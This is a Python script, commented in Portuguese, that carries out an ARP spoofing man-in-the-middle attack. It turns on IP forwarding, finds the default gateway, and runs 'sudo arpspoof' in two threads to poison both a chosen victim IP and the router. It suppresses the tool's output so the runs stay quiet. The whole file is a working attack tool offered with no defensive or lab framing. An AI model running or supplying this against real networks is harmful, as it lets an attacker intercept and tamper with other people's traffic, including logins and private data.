import subprocess
import threading
import os
import sys

def enable_ip_forwarding():
    """
    Habilita o encaminhamento de IPs no Linux escrevendo no arquivo /proc/sys/net/ipv4/ip_forward.
    """
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        print("[*] Encaminhamento de IP habilitado.")
    except PermissionError:
        print("[!] Permissão negada. Execute este script com privilégios elevados (sudo).")
    except Exception as e:
        print(f"[!] Falha ao habilitar o encaminhamento de IP: {e}")
        sys.exit(1)

def perform_arp_spoof(victim_ip, iface="eth0"):
    enable_ip_forwarding()
    try:
        # Obtém o IP do roteador padrão
        router_ip = subprocess.check_output(
            ["ip", "route"], encoding="utf-8").split("default via ")[1].split()[0]
    except Exception as e:
        print(f"[!] Falha ao obter o IP do roteador: {e}")
        sys.exit(1)

    # Cria e inicia threads para enviar ARP spoof para a vítima e para o roteador
    victim_thread = threading.Thread(target=run_arpspoof, args=(victim_ip, router_ip, iface, True))
    router_thread = threading.Thread(target=run_arpspoof, args=(victim_ip, router_ip, iface, False))

    victim_thread.start()
    router_thread.start()

def run_arpspoof(victim_ip, router_ip, iface="eth0", target_victim=True):
    """
    Envia respostas ARP não solicitadas para a vítima ou para o roteador.
    """
    try:
        # Redireciona a saída para DEVNULL para tornar o comando silencioso
        with open(os.devnull, 'w') as devnull:
            if target_victim:
                # Passo 1: Envia resposta ARP para a vítima (se fazendo passar pelo roteador)
                print(f"[*] Enviando resposta ARP para a vítima {victim_ip} (se passando pelo roteador {router_ip}).")
                subprocess.run(["sudo", "arpspoof", "-i", iface, "-t", victim_ip, router_ip],
                               stdout=devnull, stderr=devnull, check=True)
            else:
                # Passo 2: Envia resposta ARP para o roteador (se fazendo passar pela vítima)
                print(f"[*] Enviando resposta ARP para o roteador {router_ip} (se passando pela vítima {victim_ip}).")
                subprocess.run(["sudo", "arpspoof", "-i", iface, "-t", router_ip, victim_ip],
                               stdout=devnull, stderr=devnull, check=True)

    except subprocess.CalledProcessError as e:
        print(f"[!] Falha ao executar arpspoof: {e}")
        sys.exit(1)